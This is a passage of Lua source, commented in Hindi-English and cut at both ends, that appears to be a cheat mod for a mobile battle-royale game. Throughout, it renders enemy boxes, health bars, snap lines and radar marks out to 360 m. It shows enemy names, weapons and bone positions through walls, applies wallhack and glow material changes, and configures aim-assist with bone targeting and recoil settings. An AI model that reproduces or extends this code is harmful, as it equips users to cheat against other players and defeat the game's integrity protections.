            if isBot then sc.nBot = sc.nBot + 1 else sc.nReal = sc.nReal + 1 end
            out[#out + 1] = { Character = ch, Key = key, IsBot = isBot, Distance = math.sqrt(dsq) / 100.0 }
          end
        end
      end
    end
  end
  sc.i = last + 1
  if sc.i > sc.n then ESP.ScanFinish(sc) end
end

-- purana naam (synchronous): ek hi call mein poora scan
function ESP.Scan()
  local now = ESP._now or ESP.Now()
  ESP._sc = nil
  local sc = ESP.ScanBegin(now)
  local pc = ESP.GetController()
  if not sc then return pc, 0, 0 end
  sc.per = math.max(1, sc.n)
  ESP.ScanStep(now)
  return pc, ESP.RealCount or 0, ESP.BotCount or 0
end
--// SRC HUB
function ESP.RefreshViewport(pc)
  local vw, vh = ESP.Viewport(pc)
  -- viewport hysteresis: 2px se kam farq ignore (flicker fix)
  local hyst = CFG.SizeHyst or 2.0
  if math.abs(vw - (ESP.ViewW or 0)) > hyst or math.abs(vh - (ESP.ViewH or 0)) > hyst then
    ESP.ViewW, ESP.ViewH = vw, vh
  end
end

-- Jo key is Update mein draw nahi hui: cache mein ho to bas chhupa do, nahi to thodi der (ReleaseDelay) baad destroy.
-- (Pehle cache se nikalte hi widgets turant destroy ho jate the: 12vi rank par ghoomne wale enemy par roz
--  widget banna-todna = engine mein bhaari kaam + GC.)
function ESP.Sweep(gen, now)
  local active, seen, rel = ESP._active, ESP._seen, ESP.ReleaseAt
  local delay = ESP.ReleaseDelay or 2.5
  for k in pairs(ESP.Known) do
    if active[k] ~= gen then
      ESP.HideTarget(k)                     -- pehle se chhupe widgets par engine call nahi hoti
      if seen[k] == gen then
        rel[k] = nil
      else
        local t = rel[k]
        if t == nil or t - now > delay + 1.0 then
          rel[k] = now + delay
          ESP.ReleaseMark(k)                -- radar mark turant hatao
        elseif now >= t then
          ESP.ReleaseWidgets(k)
        end
      end
    else
      rel[k] = nil
    end
  end
end

--// SRC HUB
function ESP.Update(now)
  if not ESP_Enabled then ESP.ResetWidgets() return end
  now = tonumber(now) or ESP.Now()
  ESP._now = now
  -- naya match / world badla? Sirf 0.25 s mein ek baar dekhte hain (pehle har Update par ek engine call)
  local wdt = now - (ESP._worldT or -1e9)
  if wdt < 0 or wdt >= 0.25 then
    ESP._worldT = now
    local world = ESP.World()
    if world ~= ESP.LastWorld then
      ESP.ResetWidgets()
      ESP.LastWorld = world
      ESP.LastScan = -999.0
      ESP.LastTransform = -999.0
    end
  end
  local canvas = ESP.GetCanvas()
  if not canvas then return end
  local pc = ESP.GetController()
  ESP.ScanStep(now)                         -- time-sliced: har Update mein thoda hissa
  pc = pc or ESP.GetController()
  if not pc then return end
  local tdt = now - (ESP.LastTransform or -999.0)
  if tdt < 0 or tdt >= (ESP.TransformInterval or 0.50) then
    ESP.UpdateCanvasTransform(pc)
    ESP.LastTransform = now
    ESP.RefreshViewport(pc)                 -- viewport bhi isi 0.6 s tick par (pehle har Update par)
  end
  local vw, vh = ESP.ViewW, ESP.ViewH
  local origin = ESP.UpdateCounter(ESP.RealCount or 0, ESP.BotCount or 0, pc, vw)
  if not origin then return end

  local cache = ESP.EnemyCache
  local nCache = #cache
  local gen = (ESP._gen or 0) + 1
  ESP._gen = gen
  local active, seen, TS = ESP._active, ESP._seen, ESP.TS
  ESP._visLeft = ESP.VisBudget or 3
  local nReq, nDrawn = 0, 0
  local reqPool = ESP._reqPool
  if not reqPool then reqPool = {} ESP._reqPool = reqPool end
  local CFGM_esp = _G.GTLMODConfig
  local doHP, doVip, doLine, doRadar = CFGM_esp.Esp9_HP, CFGM_esp.EspVip, CFGM_esp.Esp9_Line, CFGM_esp.EspRadar
  local margin = CFG.ScreenMargin or 220
  local labelMax, snapMax = CFG.LabelMaxMeters or 100, CFG.SnapMaxMeters or 100
  local vipMax = (CFG.MaxDistance or 36000) / 100      -- diamond+meter mark range (m) = scan range = 360
  local minH = CFG.BoxMinHeight or 1.5
  local lthick = (_G.GTLMODState and _G.GTLMODState.CustomTextData
                  and _G.GTLMODState.CustomTextData.Esp9_LineThick)
                 or CFG.SnapThickness or 1.8
  local ox, oy = origin.X, origin.Y

  for i = 1, nCache do
    local item = cache[i]
    local c = item.Character
    local key = item.Key
    seen[key] = gen
    local ts = TS[key]
    if not ts then ts = {} TS[key] = ts ESP.Known[key] = true end
    if ts.c ~= c then
      ts.c = c
      ts.caps, ts.capT, ts.half, ts.halfT = nil, nil, nil, nil
      ts.alive, ts.aT, ts.hp, ts.hpT = nil, nil, nil, nil
    end
    -- alive: 0.12 s cache (pehle har Update par 2 engine calls)
    local adt = now - (ts.aT or -1e9)
    if ts.alive == nil or adt < 0 or adt >= 0.12 then
      ts.alive = ESP.IsAlive(c)
      ts.aT = now
    end
    if ts.alive then
      -- 2a) DIAMOND + METER MARK (9999): PREMIUM ALL ON ho to 360m tak (cache already 360m filtered) -- SyncVipMark dekho.
      -- pcall: mark mein koi gadbad ho to bhi line / health bar band na ho.
      pcall(ESP.SyncVipMark, key, c, doVip and (item.Distance or 0) <= vipMax, now)
      local bx, by, bz, half = ESP.TargetBounds(ts, c, now)
      local hsx, hsy, hpx, hpy, fsx, fsy, fpx, fpy
      if bx then
        hsx, hsy, hpx, hpy = ESP.ProjectXY(pc, bx, by, bz + half)
        if hsx then fsx, fsy, fpx, fpy = ESP.ProjectXY(pc, bx, by, bz - half) end
      end
      if hsx and fsx then
        local on = hpx > -margin and hpx < vw + margin
          and hpy > -margin and hpy < vh + margin
          and fpx > -margin and fpx < vw + margin
          and fpy > -margin and fpy < vh + margin
        local boxH = fsy - hsy
        -- sanity: ulti box / bahut badi box = garbage projection, hide
        if on and boxH >= minH and boxH <= vh * 1.5 then
          active[key] = gen
          nDrawn = nDrawn + 1
          local W = boxH * (CFG.BoxWidthFactor or 0.62)
          W = math.max(CFG.BoxMinWidth or 22, math.min(CFG.BoxMaxWidth or 320, W))
          local padT = boxH * (CFG.HeadExtra or 0)
          local cxm = (hsx + fsx) * 0.5
          local L = cxm - W * 0.5
          local R = cxm + W * 0.5
          local T = hsy - padT

          -- 2) HEALTH BAR -- sirf tab jab Esp9_HP ON ho (health 0.1 s cache)
          if doHP then
            local hdt = now - (ts.hpT or -1e9)
            if ts.hp == nil or hdt < 0 or hdt >= 0.1 then
              ts.hp = ESP.GetHealthPct(c)
              ts.hpT = now
            end
            local knocked = ESP.IsKnocked(c)
            ESP.UpdateHealthBar(key, ts.hp, L, R, T, knocked)
          else
            ESP.Hide(ESP.HealthBg[key])
            ESP.Hide(ESP.HealthFill[key])
          end

          -- 2b) RADAR MARK 360m -- EspRadar ON ho to 360m tak mark lagao
          -- [Fix 3] Radar ab ESP.EnemyCache se kaam karta hai jo already 360m filtered hai
          -- Game tick loop sirf ~100m tak characters load karta hai; ye wahan se independent hai
          if doRadar and _G.GTLMODState then
            -- markData entry ensure karo (door wale enemies ke liye)
            if not _G.GTLMODState.EnemyMarks then _G.GTLMODState.EnemyMarks = {} end
            _G.GTLMODState.EnemyMarks[key] = _G.GTLMODState.EnemyMarks[key] or { enemy = c }
            local markData360 = _G.GTLMODState.EnemyMarks[key]
            if not markData360.radarMark or markData360.radarMark == 0 then
              markData360.radarMark = SafeAddMark(8888, FVector(0,0,0), 0, "", 4, c)
            end
          elseif not doRadar and _G.GTLMODState and _G.GTLMODState.EnemyMarks then
            -- EspRadar OFF: is enemy ka radar mark hata do (agar ESP.Update ne lagaya tha)
            local md = _G.GTLMODState.EnemyMarks[key]
            if md and md.radarMark and md.radarMark ~= 0 then
              pcall(SafeRemoveMark, md.radarMark)
              md.radarMark = nil
            end
          end

          -- 3) NAME + METER LABEL -- EspVip ON ho aur 100m ke andar ho tab dikhao
          -- [Fix 2] Labels ab ESP line jaisa same range (100m) mein kaam karengi
          local dm = item.Distance or 0
          if doVip and dm <= labelMax then
            -- label request pool mein daalo -- LayoutLabels baad mein sab ek saath place karta hai
            nReq = nReq + 1
            local req = reqPool[nReq]
            if not req then req = {} reqPool[nReq] = req end
            req.key  = key
            req.name = ESP.GetNameCached(key, c)
            req.dist = dm
            -- feet ke neeche 4px label position
            req.x    = RND(cxm)
            req.y    = RND(fsy + 4)
          else
            ESP.Hide(ESP.Labels[key])
          end

          -- 4+5) SNAP LINE -- Esp9_Line ON aur enemy 100m ke andar ho tab hi.
          -- Visibility check sirf line ke color ke liye (0.15 s cache, ek Update mein limited)
          if doLine and dm <= snapMax then
            local bVis = ESP.IsVisible(key, pc, c, now)
            local snapData = ESP.EnsureSnap(key)
            if bVis then ESP.SetBrush(snapData, ESP.SNAP_RED, "snap_red")
            else ESP.SetBrush(snapData, C_GREEN, "snap_green") end
            ESP.DrawLine(snapData, ox, oy, hsx, hsy, lthick)
          else
            ESP.Hide(ESP.Lines[key])
          end
        else
          ESP.HideTarget(key)
        end
      else
        ESP.HideTarget(key)
      end
    else
      pcall(ESP.SyncVipMark, key, c, false, now)      -- mara hua enemy: diamond turant hatao
    end
  end
  -- [v5.0] sab labels ek saath smart layout se rakho (overlap/garble fix)
  ESP.LayoutLabels(reqPool, nReq)
  -- stale: jo is frame me nahi dikha usko hide; jo cache me bhi nahi usko (thodi der baad) release
  ESP.Sweep(gen, now)
  ESP._nCache, ESP._nDrawn = nCache, nDrawn
end

-- Update ki raftaar (wall-clock gap, second). 60 FPS par: 0.015 = har frame, 0.030 = har 2nd, 0.045 = har 3rd.
--   * cache khaali (koi enemy range mein nahi)  -> IdleGap: sirf housekeeping (tile / scan), line/bar kuch nahi
--   * cache mein koi bhi ho                      -> load = cache + 2 x screen par dikhne wale, tier table se
-- Tier badalne par hysteresis (+-2) hai: load 12 ke aas-paas ho to speed baar baar upar-neeche nahi hoti.
ESP.IdleGap = 0.100
ESP.GateTable = {
  { 20,  0.015 },     -- normal fight (kuch hi enemy): har frame, full smooth
  { 36,  0.030 },     -- bheed: har 2nd frame
  { 1e9, 0.045 },     -- bahut bheed: har 3rd frame
}
function ESP.GateGap(load)
  local t = ESP.GateTable
  local n = #t
  local i = ESP._gi or 1
  if i > n then i = n end
  while i < n and load > t[i][1] + 2 do i = i + 1 end          -- slow: tabhi jab limit se saaf upar
  while i > 1 and load <= t[i - 1][1] - 2 do i = i - 1 end      -- fast: tabhi jab pichli limit se saaf neeche
  ESP._gi = i
  return t[i][2]
end

-- Single driver: sirf ek repeating timer (lag/flicker fix).
-- Purana triple-driver (Tick loop + 2x AddGameTimer) hata diya.
-- Throttle ab WALL-CLOCK par hai. Pehle os.clock() tha -- Android par wo CPU-time hai (saare threads ka jod, wall se
-- 2-5x tez bhagta hai), isliye gate lagbhag kabhi nahi rukta tha aur Update har frame chal jata tha.
-- Do drivers (ticker + AddGameTimer) ek hi frame mein dono bulayein to dusra apne aap ruk jata hai (dt == 0).
function ESP.Tick()
  local now = ESP.Now()
  local dt = now - (ESP._lastTick or -1e9)
  local nC = ESP._nCache or 0
  local gap
  if nC == 0 then
    gap = ESP.IdleGap
    ESP._gi = 1
  else
    gap = ESP.GateGap(nC + 2 * (ESP._nDrawn or 0))
  end
  ESP.GateGapNow = gap
  if dt >= 0 and dt < gap then return end
  ESP._lastTick = now
  _G.GTLSafe("ESP.Update", ESP.Update, now)
end

function ESP.AttachTimers()
  pcall(function()
    local pc = ESP.GetController()
    if ESPValid(pc) and pc.AddGameTimer then
      if ESP._TimerPC == pc and ESP._TimerHooked then return end
      ESP._TimerPC = pc
      ESP._TimerHooked = true
      -- ek hi repeating timer: andar Scan (0.35) + Transform (0.5) throttled
      pc:AddGameTimer(ESP.LightInterval or 0.033, true, function()
        if ESP.bActive then pcall(ESP.Tick) end
      end)
    else
      ESP._TimerHooked = false
    end
    -- Sirf EK retry timer pending reh sakta hai. Purane code mein har fail par 2 chains ban jati thi
    -- (1s + 5s), jo controller invalid rehne par timers ko double karti thi.
    if ESP._RetryPending then return end
    ESP._RetryPending = true
    local ok = pcall(function()
      require("timer").SetGameTimer((ESPValid(pc) and pc.AddGameTimer) and 5.0 or 1.0, false, function()
        ESP._RetryPending = false
        ESP.AttachTimers()
      end)
    end)
    if not ok then ESP._RetryPending = false end
  end)
end

function ESP.Start()
  if ESP.bActive then return end
  ESP.bActive = true
  pcall(ESP.Update)
  ESP.AttachTimers()
end

_G.ESP = ESP
_G.PlayerMapMarker = ESP

local function ESPLater(sec, fn)
  local tk = nil
  pcall(function() tk = require("common.time_ticker") end)
  if tk and tk.AddTimerOnce then pcall(function() tk.AddTimerOnce(sec, fn) end) return end
  pcall(function() require("timer").SetGameTimer(sec, false, fn) end)
end

local _ESPStartedPC = nil
local function ESPStartAll()
  pcall(function()
    local pc = nil
    if slua_GameFrontendHUD then pc = slua_GameFrontendHUD:GetPlayerController() end
    if not ESPValid(pc) then pc = ESP.GetController() end
    if ESPValid(pc) then
      if pc ~= _ESPStartedPC then
        _ESPStartedPC = pc
        ESP._TimerHooked = false
        ESP._TimerPC = nil
        ESP.Start()
      else
        ESP.AttachTimers()
      end
    end
  end)
end

pcall(function()
  ESPStartAll()
  ESPLater(1.0, ESPStartAll)
end)
if not _G.__ESPLookTickStarted then
  _G.__ESPLookTickStarted = true
  ESP.bActive = true
  ESP.AttachTimers()
end

_G.PMM_ESPV2 = ESP
-- Canvas engine: line / health bar / counter mein se koi ek ON ho to chalega
_G.PMM_ESPV2_AnyOn = function()
    local C = _G.GTLMODConfig
    return (C.Esp9_Line or C.Esp9_HP or C.Esp9_Count) and true or false
end
end

-- init karo turant
pcall(function() if _G.LoadESPV2System then _G.LoadESPV2System() end end)

local function MainLoop()
    local CFGM = _G.GTLMODConfig
    if isExpired then return end

    if _G.GTLMODState.CustomTextData == nil then
        _G.GTLMODState.CustomTextData = {
            OuterSpeed = 10, InnerSpeed = 10, HRecoil = 0.3, VRecoil = 0.3, IpadViewFOV = 120,
            Esp9_LineThick = 1,
            AimTouchHipPrio  = 1, AimTouchHipBone = 1, AimTouchHipCond = 1,
            AimTouchHipSpeed = 50, AimTouchHipFOV = 30, AimTouchHipDist = 250,
            AimTouchSGPrio  = 1, AimTouchSGBone = 2, AimTouchSGCond = 1,
            AimTouchSGSpeed = 80, AimTouchSGFOV = 40, AimTouchSGDist = 30,
            AimTouchScopePrio  = 1, AimTouchScopeBone = 2, AimTouchScopeCond = 1,
            AimTouchScopeSpeed = 40, AimTouchScopeFOV = 20, AimTouchScopeDist = 300,
            AimTouchScopePred  = 0, AimTouchScopeRecoil = 0,
            AimTouchSniperPrio  = 1, AimTouchSniperBone = 1, AimTouchSniperCond = 2,
            AimTouchSniperSpeed = 30, AimTouchSniperFOV = 20, AimTouchSniperDist = 400,
            AimTouchSniperPred  = 0,
        }
    end

    local okData, GameplayData = pcall(require, "GameLua.GameCore.Data.GameplayData") 
    if not okData or not GameplayData then return end 
    local pc = GameplayData.GetPlayerController() 
    local localPlayer = nil
    if Valid(pc) then localPlayer = pc:GetPlayerCharacterSafety() end 

    if not Valid(localPlayer) then 
        if _G.GTLMODState.TrackedMarks then
            for markId, _ in pairs(_G.GTLMODState.TrackedMarks) do
                SafeRemoveMark(markId)
            end
        end
        _G.GTLMODState.TrackedMarks = {} 
        
        for key, data in pairs(_G.GTLMODState.EnemyMarks) do
            if data and data.MIDs then
                for meshStr, midTable in pairs(data.MIDs) do
                    for k, _ in pairs(midTable) do midTable[k] = nil end
                end
                data.MIDs = nil
            end
        end
        
        _G.GTLMODState.EnemyMarks = {}
        _G.GTLMODState.EnemyJob = nil
        _G.AK_OrigHitboxes = {}
        _G.AK_ModdedPhysAssets = {}
        _G.GTLMODState.PrevGraphicsState = {}
        return 
    end

    local Cached_PPM = nil
    pcall(function() Cached_PPM = import("PostProcessManager").GetInstance() end)
    local Cached_SecurityCommonUtils = nil
    pcall(function() Cached_SecurityCommonUtils = require("GameLua.Mod.BaseMod.Common.Security.SecurityCommonUtils") end)
    local Cached_MyHUD = pc and pc.MyHUD or nil

    local _inSpecialDash = false
    pcall(function()
        local EPawnState_local = import("EPawnState")
        if EPawnState_local and type(localPlayer.HasState) == "function" then
            if localPlayer:HasState(EPawnState_local.SpecialSuit) then _inSpecialDash = true end
        end
    end)

    if CFGM.UnlockFPS then InitializeGraphicsUnlock() end
    InitializeNativeESP()
    ShowGTLMODVIPMenu()

    if _G.PMM_ESPV2_AnyOn() then
        if _G.PMM_ESPV2 then
            if not _G.PMM_ESPV2.bActive then _G.PMM_ESPV2.Start() end
        end
    else
        if _G.PMM_ESPV2 and _G.PMM_ESPV2.bActive then
            _G.PMM_ESPV2.bActive = false
            pcall(function() _G.PMM_ESPV2.ResetWidgets() end)
        end
    end
    
    if CFGM.IpadView and _G.GTLMODState.CustomTextData then
        pcall(function()
            local targetTPP = _G.GTLMODState.CustomTextData.IpadViewFOV or 120
            local uTPPCam = localPlayer.ThirdPersonCameraComponent
            if Valid(uTPPCam) and not localPlayer.bIsWeaponAiming then
                if uTPPCam.FieldOfView ~= targetTPP then uTPPCam.FieldOfView = targetTPP end
            end
        end)
    else
        pcall(function()
            local uTPPCam = localPlayer.ThirdPersonCameraComponent
            if Valid(uTPPCam) and not localPlayer.bIsWeaponAiming then
                if uTPPCam.FieldOfView ~= 80 then uTPPCam.FieldOfView = 80 end
            end
        end)
    end

    local now = os.clock()
    pcall(function()
        local lsg = require("client.slua.logic.setting.logic_setting_graphics")
        local gi = lsg.GetGameInstance()
        if gi then
            if CFGM.HDRGlow then
                local g = tonumber(_G.ColorConfig.Glow) or 3.0
                local offset = math.floor(200 * (g / 3.0))
                if offset < 1 then offset = 1 end
                local key = tostring(offset)
                if _G.GTLMODState.PrevGraphicsState.GlowKey ~= key then
                    _G.GTLMODState.PrevGraphicsState.GlowKey = key
                    gi:ExecuteCMD("r.CharacterMinShadowFactor", "4")
                    gi:ExecuteCMD("r.CharacterDiffuseOffset", key)
                    gi:ExecuteCMD("r.CharacterDiffusePower", key)
                end
            elseif _G.GTLMODState.PrevGraphicsState.GlowKey then
                _G.GTLMODState.PrevGraphicsState.GlowKey = nil
                gi:ExecuteCMD("r.CharacterMinShadowFactor", "1")
                gi:ExecuteCMD("r.CharacterDiffuseOffset", "0")
                gi:ExecuteCMD("r.CharacterDiffusePower", "1")
            end
            
            if CFGM.BlackSky and not _G.GTLMODState.PrevGraphicsState.BlackSky then
                gi:ExecuteCMD("r.CylinderMaxDrawHeight", "9999")
                _G.GTLMODState.PrevGraphicsState.BlackSky = true
            elseif not CFGM.BlackSky and _G.GTLMODState.PrevGraphicsState.BlackSky then
                gi:ExecuteCMD("r.CylinderMaxDrawHeight", "0000")
                _G.GTLMODState.PrevGraphicsState.BlackSky = false
            end
        end
    end)

    pcall(function()
        local allCharacters = {}
        if GameplayData.GetAllPlayerCharacters then allCharacters = GameplayData.GetAllPlayerCharacters()
        elseif GameplayData.GameCharacters then for _, char in pairs(GameplayData.GameCharacters) do table.insert(allCharacters, char) end end

        local mLoc = nil
        pcall(function() if type(localPlayer.K2_GetActorLocation) == "function" then mLoc = localPlayer:K2_GetActorLocation() end end)

        local ST = _G.GTLMODState
        local tNow = os.clock()
        local prevJob = ST.EnemyJob
        if prevJob and (tNow - prevJob.t0) < 8.0 then
        else
            local pawns = ST.PawnBuf
            if not pawns then pawns = {}; ST.PawnBuf = pawns end
            local nP = 0
            for _, p in pairs(allCharacters) do nP = nP + 1; pawns[nP] = p end
            for i = nP + 1, #pawns do pawns[i] = nil end

            local J = { i = 0, n = nP, pawns = pawns, t0 = tNow, seen = {} }
            ST.EnemyJob = J
            local seenKeys = J.seen

            local myTeamRaw = localPlayer.TeamID

            local function readHS(p) return p.HealthStatus end
            local function deadFn(p)
                if type(p.IsDead) == "function" then return p:IsDead()
                elseif p.bIsDead ~= nil then return p.bIsDead
                elseif p.bIsDeadFlag ~= nil then return p.bIsDeadFlag end
                return false
            end
            local function distFn(p) return localPlayer:GetDistanceTo(p) end
            local Sx = { d = nil, done = false }
            local function distOf(p)
                if not Sx.done then
                    Sx.done = true
                    local okd, v = pcall(distFn, p)
                    if okd and tonumber(v) then Sx.d = v end
                end
                return Sx.d
            end

            local function enemyBody(enemy, eKey, hs)
                local bIsReallyDead = false
                local okDead, dv = pcall(deadFn, enemy)
                if okDead and dv then bIsReallyDead = dv end
                if hs ~= nil and hs == 2 then bIsReallyDead = true end

                local marksT = _G.GTLMODState.EnemyMarks
                local markData = marksT[eKey]
                if not markData then markData = { enemy = enemy }; marksT[eKey] = markData end
                markData.enemy = enemy 

                if not bIsReallyDead then
                    if markData.lastEnemyActor ~= enemy then
                        if markData.hpMark then SafeRemoveMark(markData.hpMark); markData.hpMark = nil end
                        if markData.hpMark8 then SafeRemoveMark(markData.hpMark8); markData.hpMark8 = nil end
                        if markData.distMark then SafeRemoveMark(markData.distMark); markData.distMark = nil end
                        if markData.radarMark then SafeRemoveMark(markData.radarMark); markData.radarMark = nil end
                        
                        markData.lastEnemyActor = enemy
                        markData.LastUIComp = nil
                        markData.LastFrameUIState = nil
                    end
                    
                    local eMesh = nil
                    if CFGM.wallhackng or CFGM.ColorBodyV2 or CFGM.Esp6 then
                        pcall(function() eMesh = enemy.Mesh or (type(enemy.getAvatarComponent2) == "function" and enemy:getAvatarComponent2() or nil) end)
                    end
                    local aLoc = nil
                    if CFGM.Esp5 or CFGM.EspVip or CFGM.Esp6 then
                        pcall(function() if type(enemy.K2_GetActorLocation) == "function" then aLoc = enemy:K2_GetActorLocation() end end)
                    end
                    
                    local isBotResult, isStateLoaded = CheckIsAI(enemy, markData)
                    local isBot = markData.AK_IS_BOT or false

                    local currentMeshCount = 0
                    local isMeshChanged = false
                    if CFGM.wallhackng or CFGM.ColorBodyV2 then
                        if Valid(eMesh) then
                            local tempMeshes = GetAllSkeletalMeshes(enemy, markData)
                            currentMeshCount = #tempMeshes
                        end
                        isMeshChanged = (markData.LastMeshCountWall ~= currentMeshCount)
                    end

                    if CFGM.wallhackng then
                        if isMeshChanged or not markData.WallhackApplied then
                            Applywallhackng(enemy, markData)
                            markData.WallhackApplied = true
                            markData.LastMeshCountWall = currentMeshCount
                        end
                    else
                        Undowallhackng(enemy, markData)
                    end

                    if CFGM.ColorBodyV2 then
                        if isMeshChanged or not markData.ColorBodyApplied then
                            ApplyColorBodyV2(enemy, pc, markData)
                            markData.ColorBodyApplied = true
                        end
                    else
                        if markData.ColorBodyApplied then
                            UndoColorBodyV2(enemy, markData)
                            markData.ColorBodyApplied = false
                        end
                    end

                    if CFGM.WallhackV2 then
                        ApplyWallhackV2(enemy, markData)
                    else
                        UndoWallhackV2(enemy, markData)
                    end

                    local distM = 0
                    local dcm = distOf(enemy)
                    if dcm then distM = dcm / 100 end

                    local currentHp, maxHp = 100, 100
                    local showFrameUI = CFGM.Esp5 or CFGM.EspVip
                    
                    if showFrameUI then
                        pcall(function()
                            if enemy.Health then currentHp = enemy.Health elseif type(enemy.GetHealth) == "function" then currentHp = enemy:GetHealth() end
                            if enemy.HealthMax then maxHp = enemy.HealthMax elseif type(enemy.GetHealthMax) == "function" then maxHp = enemy:GetHealthMax() end
                        end)
                        if maxHp <= 0 then maxHp = 100 end
                    end
                    local hpRatio = currentHp / maxHp

                    if CFGM.EspAntenna then
                        local nowAnt = os.clock()
                        if not markData.AntennaTime or (nowAnt - markData.AntennaTime) >= 0.08 then
                            markData.AntennaTime = nowAnt
                            pcall(function()
                                local MyHUD = Cached_MyHUD
                                if Valid(MyHUD) and distM <= 400 then
                                    local loopCount = 8
                                    local zStep = 1000
                                    local baseZ = 105
                                    local topZ = baseZ + (loopCount * zStep)
                                    for i = 1, loopCount do
                                        local zOffset = baseZ + (i * zStep)
                                        MyHUD:AddDebugText("|", enemy, 0.09,
                                            {X=0, Y=0, Z=zOffset}, {X=0, Y=0, Z=zOffset},
                                            C_GREEN, true, false, true, nil, 1.2, true)
                                    end
                                    MyHUD:AddDebugText("I", enemy, 0.09,
                                            {X=0, Y=0, Z=topZ + 60}, {X=0, Y=0, Z=topZ + 60},
                                            C_GREEN, true, false, true, nil, 1.5, true)
                                end
                            end)
                        end
                    end

                    if CFGM.Esp6 then
                        pcall(function()
                            local curTime = os.clock()
                            local nEsp6Active = #(ESP.EnemyCache or {})
                            local esp6Gap = nEsp6Active >= 15 and 0.10 or nEsp6Active >= 8 and 0.07 or 0.05
                            if markData.LastEsp6Time == nil or (curTime - markData.LastEsp6Time) >= esp6Gap then
                                markData.LastEsp6Time = curTime
                                
                                local MyHUD = Cached_MyHUD
                                if Valid(MyHUD) and Valid(eMesh) and aLoc then
                                    if distM <= 250 then
                                        if type(eMesh.GetSocketLocation) == "function" then
                                            for _, bName in ipairs(GLOBAL_BONE_LIST) do
                                                
                                                if distM > 50 and (bName ~= "head" and bName ~= "pelvis" and bName ~= "neck_01") then
                                                else
                                                    local wLoc = eMesh:GetSocketLocation(bName)
                                                    if wLoc then
                                                        local offset = {X = wLoc.X - aLoc.X, Y = wLoc.Y - aLoc.Y, Z = wLoc.Z - aLoc.Z}
                                                        
                                                        local mark = "▪"
                                                        local fixedSize = 0.25 
                                                        local color = C_CYAN
                                                        
                                                        if bName == "head" then 
                                                            mark = "●"
                                                            fixedSize = 0.45
                                                            color = C_RED
                                                        elseif bName == "pelvis" or bName == "neck_01" then 
                                                            mark = "▪"
                                                            fixedSize = 0.35
                                                            color = C_YELLOW 
                                                        end
                                                        
                                                        MyHUD:AddDebugText(mark, enemy, 0.06, offset, offset, color, true, false, true, nil, fixedSize, true)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                    end

                    if CFGM.EspWeapon then
                        pcall(function()
                            local MyHUD = Cached_MyHUD
                            if not Valid(MyHUD) then return end
                            if distM > 400 then return end

                            local curTime = os.clock()
                            if markData.AK_LAST_WEP_TIME == nil or curTime > markData.AK_LAST_WEP_TIME + 1.5 then
                                local eWeapon = nil
                                if enemy.CurrentWeapon then eWeapon = enemy.CurrentWeapon
                                elseif type(enemy.GetCurrentWeapon) == "function" then eWeapon = enemy:GetCurrentWeapon()
                                elseif enemy.WeaponManagerComponent then eWeapon = enemy.WeaponManagerComponent.CurrentWeaponReplicated end

                                local weaponName = "No Weapon"
                                if Valid(eWeapon) and type(eWeapon.GetWeaponName) == "function" then
                                    weaponName = eWeapon:GetWeaponName()
                                end
                                markData.AK_CACHED_WEP_NAME = tostring(weaponName)
                                markData.AK_LAST_WEP_TIME = curTime
                            end

                            local wepText = markData.AK_CACHED_WEP_NAME or "No Weapon"
                            if wepText ~= "" then
                                local textColor = isBot and C_CYAN or C_YELLOW
                                local dynamicScale = math.max(0.5, 0.8 - (distM / 400))
                                MyHUD:AddDebugText(wepText, enemy, 0.5, {X=0, Y=0, Z=100}, {X=0, Y=0, Z=100}, textColor, true, false, true, nil, dynamicScale, true)
                            end
                        end)
                    end
                    if showFrameUI then
                        pcall(function()
                            local SecurityCommonUtils = Cached_SecurityCommonUtils
                            local show = true
                            if hs and SecurityCommonUtils and SecurityCommonUtils.IsHealthStatusAlive then 
                                if not SecurityCommonUtils.IsHealthStatusAlive(hs) then show = false end
                            end
                            if show and mLoc then
                                if aLoc and SecurityCommonUtils and SecurityCommonUtils.IsVector then
                                    if SecurityCommonUtils.IsVector(aLoc) and SecurityCommonUtils.IsVector(mLoc) then
                                        if aLoc.Z >= 150000 or FVector.Dist2D(mLoc, aLoc) > 50000 then show = false end
                                    end
                                end
                            end
                            if show then
                                if enemy.Replay_IsEnemyFrameUIExisted and not enemy:Replay_IsEnemyFrameUIExisted() then enemy:Replay_CreateEnemyFrameUI(true, true) end
                                if enemy.Replay_SetVisiableOfFrameUI then enemy:Replay_SetVisiableOfFrameUI(true) end
                                if enemy.Replay_UpdateEnemyFrameUI then enemy:Replay_UpdateEnemyFrameUI(hpRatio) end
                                
                                local uiComp = enemy.EnemyFrameUI or (type(enemy.GetEnemyFrameUI) == "function" and enemy:GetEnemyFrameUI())
                                if Valid(uiComp) then
                                    if markData.LastFrameUIState ~= "VISIBLE" then
                                        if type(uiComp.SetVisibility) == "function" then uiComp:SetVisibility(0) end
                                        if type(uiComp.SetHiddenInGame) == "function" then uiComp:SetHiddenInGame(false) end
                                        markData.LastFrameUIState = "VISIBLE"
                                    end
                                end
                            end
                        end)
                    else
                        pcall(function()
                            if enemy.Replay_SetVisiableOfFrameUI then enemy:Replay_SetVisiableOfFrameUI(false) end
                            local uiComp = enemy.EnemyFrameUI or (type(enemy.GetEnemyFrameUI) == "function" and enemy:GetEnemyFrameUI())
                            if Valid(uiComp) then
                                if markData.LastFrameUIState ~= "HIDDEN" then
                                    if type(uiComp.SetVisibility) == "function" then uiComp:SetVisibility(2) end
                                    if type(uiComp.SetHiddenInGame) == "function" then uiComp:SetHiddenInGame(true) end
                                    markData.LastFrameUIState = "HIDDEN"
                                end
                            end
                        end)
                    end

                    -- ESP HEALTH V1 (EspVipPro) hata diya gaya: koi menu button nahi tha.

-- =================== ESP NAME V1 (Nama dengan warna dari ColorConfig) ===================
if CFGM.EspName then
    -- [OPTIMIZED] Per-enemy 0.1s throttle + state cache -- no blink, no redundant calls
    local nowName = os.clock()
    if not markData.NameTime or (nowName - markData.NameTime) >= 0.1 then
        markData.NameTime = nowName
        pcall(function()
            local hud = Cached_MyHUD
            if not (Valid(hud) and hud.AddDebugText) then return end
            if distM > 400 then return end

            local pName = enemy.PlayerName or enemy.PlayerNamePublic or "Enemy"
            if pName == "" then return end

            local isKnock = (enemy.Health or 100) <= 0 or enemy.HealthStatus == 1
            local bIsVisible = IsEnemyVisibleStrong(enemy, pc, markData)

            local visibleCol = GetAppliedColor(_G.ColorConfig.VisibleColor or 4, _G.ColorConfig.Brightness)
            local invisibleCol = GetAppliedColor(_G.ColorConfig.InvisibleColor or 1, _G.ColorConfig.Brightness)

            local nameColor
            if isKnock then
                nameColor = {R=0, G=0, B=255, A=255}
            else
